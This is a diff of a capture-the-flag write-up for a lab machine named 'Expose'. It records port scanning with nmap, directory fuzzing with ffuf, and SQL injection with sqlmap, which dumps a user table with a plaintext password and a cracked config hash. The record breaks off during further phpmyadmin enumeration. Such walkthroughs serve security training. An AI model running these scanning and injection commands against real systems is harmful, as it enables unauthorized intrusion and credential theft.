@@ -1,4 +1,4 @@
-To check my VPN connection was working I started with "ping -c4 10.10.116.11", everything seems to be working fine so let's start.
+To check my VPN connection was working I started with "ping -c4 10.10.116.11", Everything seems to be working fine so let's start.
 I ran "sudo nmap -sS -p- 10.10.116.111" to get an initial understanding of what ports were open on the target.
 
 {
@@ -99,6 +99,35 @@ Nmap done: 1 IP address (1 host up) scanned in 24.93 seconds
 
 So there is FTP, SSH, DNS domain, waste p2p encrypted file sharing software, and MQTT which is a home automation protocol running.
 FTP server allows anonymous login without a password so let's start there. There are no files but the welcome message is "220 Welcome to the Expose Web Challenge.".
-Went to "http://10.10.116.111:1337" with the browser and got a plank page with "EXPOSED" in it. Lets use ffuf to try to find so directories.
-"ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.116.111:1337/FUZZ" found /admin, /javascript & /phpmyadmin.
-/admin and /phpmyadmin both have login pages
+Went to "http://10.10.116.111:1337" with the browser and got a plank page with "EXPOSED" in it. Let's use ffuf to try to find some directories.
+"ffuf -w /usr/share/wordlists/dirb/big.txt -u http://10.10.116.111:1337/FUZZ" found "/admin, /admin_101, /javascript, /phpmyadmin & /server-status".
+
+"/admin, /admin_101 & /phpmyadmin" all have login pages but "/admin" states "Is this the right admin portal?". Testing "/admin" login does not really do anything so let's look at the "/admin_101" next.
+Used burp to proxy the request to a file for sqlmap to test for injection vulnerabilities. 
+"sqlmap -l req --level=4 --risk=2" tells that backend server seems to be "MySQL" 
+"sqlmap -l req --dbms=MySQL --dbs" found "[*] expose,[*] information_schema,[*] mysql,[*] performance_schema,[*] phpmyadmin,[*] sys" databases.
+"sqlmap -l req --dbms=MySQL -D expose,mysql,phpmyadmin -tables" dumps tables from databases "expose,mysql,phpmyadmin".
+I started with expose database. There were "user, config" tables so lets find out columns for "user" table. 
+"sqlmap -l req --dbms=MySQL -D expose -T user --columns" found "created,email,id,password" columns so let's dump them!
++-----------------+----+--------------------------------------+
+| email           | id | password                             |
++-----------------+----+--------------------------------------+
+| hacker@root.thm | 1  | VeryDifficultPassword!!#@#@!#!@#1231 |
++-----------------+----+--------------------------------------+
+This grants login to "/admin_101" but there is nothing.
+
+"sqlmap -l req --dbms=MySQL -D expose -T config --dump" gives more interesting output:
++----+------------------------------+-----------------------------------------------------+
+| id | url                          | password                                            |
++----+------------------------------+-----------------------------------------------------+
+| 1  | /file1010111/index.php       | 69c66901194a6486176e81f5945b8929                    |
+| 3  | /upload-cv00101011/index.php | // ONLY ACCESSIBLE THROUGH USERNAME STARTING WITH Z |
++----+------------------------------+-----------------------------------------------------+
+I tried to crack hash with john but it didn't work. I used crackstation.com to see if it would work, and it did. Password is "easytohack".
+
+
+
+
+I fuzzed further "/phpmyadmin" portal with "ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://10.10.116.111:1337/phpmyadmin/FUZZ -fs 14773" 
+and there are more directories "templates, themes, doc, js, libraries, sql, locale".
+
